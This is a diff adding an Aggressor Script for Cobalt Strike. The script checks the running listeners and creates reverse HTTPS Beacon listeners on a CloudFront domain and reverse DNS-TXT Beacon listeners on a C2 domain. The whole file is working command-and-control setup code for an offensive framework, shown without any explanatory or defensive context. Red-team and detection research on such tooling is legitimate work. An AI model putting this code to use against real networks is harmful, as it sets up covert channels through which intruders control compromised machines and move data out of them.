@@ -1,0 +1,59 @@
+sub listener_setup {
+    local('$listener', '$listener_info', '$https', '$dns');
+
+    $https = 'f';
+    $dns = 'f';
+
+    # check what listeners are already up and running
+    foreach $listener (listeners()) {
+
+        $listener_info = listener_info($listener);
+
+        if (($listener_info['port'] == '443') && 
+            ($listener_info['host'] eq $cloudfront_domain)) 
+        {
+            $https = 't';
+        }
+        else if (($listener_info['port'] == '53') && 
+            ($listener_info['host'] eq $c2_domain)) 
+        {
+            $dns = 't';
+        }
+    }
+
+    if ($https eq 'f') {
+        create_listener("HTTPS", "windows/beacon_https/reverse_https",
+            $cloudfront_domain, 443);
+    }
+
+    if ($dns eq 'f') {
+        create_listener("DNS", "windows/beacon_dns/reverse_dns_txt",
+            $c2_domain, 53);
+    }
+
+}
+
+sub create_listener {
+    # $1 - listener name
+    # $2 - payload type
+    # $3 - host and beacons domain
+    # $4 - port
+
+    listener_create_ext($1, $2,
+        %(host => $3,
+        beacons => $3,
+        profile =>"default",
+        port => $4,
+        strategy => "round-robin"
+        )
+    );
+
+    if (checkError($error)) {
+        warn($error);
+    }
+    else {
+        $time = dstamp(ticks());
+        elog("\c9$1 \c0 listener started");
+    }
+
+}
